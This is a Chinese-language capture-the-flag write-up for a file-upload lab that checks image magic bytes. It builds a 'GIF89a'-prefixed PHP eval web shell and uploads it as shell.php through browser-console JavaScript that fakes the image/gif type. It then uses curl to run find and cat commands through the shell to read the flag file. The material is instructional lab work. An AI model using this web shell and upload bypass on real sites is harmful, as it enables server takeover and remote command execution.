## 题目分析
本关卡不仅校验了文件的后缀名，还进一步校验了文件的**文件头（Magic Bytes）**。服务器会读取文件的前几个字节，判断其是否为真实的图片文件（如 JPEG 的 `FF D8 FF`，GIF 的 `GIF89a`，PNG 的 `89 50 4E 47`）。如果只是简单的纯 PHP 文件，会被服务器直接拒绝。

## 绕过原理：图片马
为了绕过文件头检查，我们需要制作一个“图片马”。原理是在 PHP 代码的最前面加上标准的图片文件头（如 `GIF89a`）。PHP 引擎在解析文件时，遇到 `<?php` 标签才会当作代码执行，而前面的图片头会被当作普通的文本（HTML）直接输出。这样既能骗过服务器的文件头检查，又能正常执行木马。

## 攻击过程

### 步骤一：在控制台注入带文件头的木马
结合前面关卡的技巧，直接按 `F12` 打开控制台（Console），执行以下 JavaScript 代码，自动生成并上传图片马：

javascript
// 1. 拼接 GIF 文件头和 PHP 木马
let shellCode = "GIF89a\n<?php @eval($_POST['pass']);?>";
// 2. 伪装成 image/gif 类型
let blob = new Blob([shellCode], {type: 'image/gif'});
let file = new File([blob], "shell.php", {type: 'image/gif'});

// 3. 注入到表单并自动提交
let dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
document.querySelector('input[type="file"]').files = dataTransfer.files;

setTimeout(() => {
    document.querySelector('input[type="submit"]').click();
}, 500);

## 获取 Flag
由于上传成功，继续使用 curl 执行命令：
### 查找 Flag 文件：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('find / -name *flag*');"
(在返回的列表第一行，可以看到我们注入的 GIF89a 成功执行了，并定位到 /var/www/html/flag_1902713789.php)
### 读取 Flag：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('cat /var/www/html/flag_1902713789.php');"
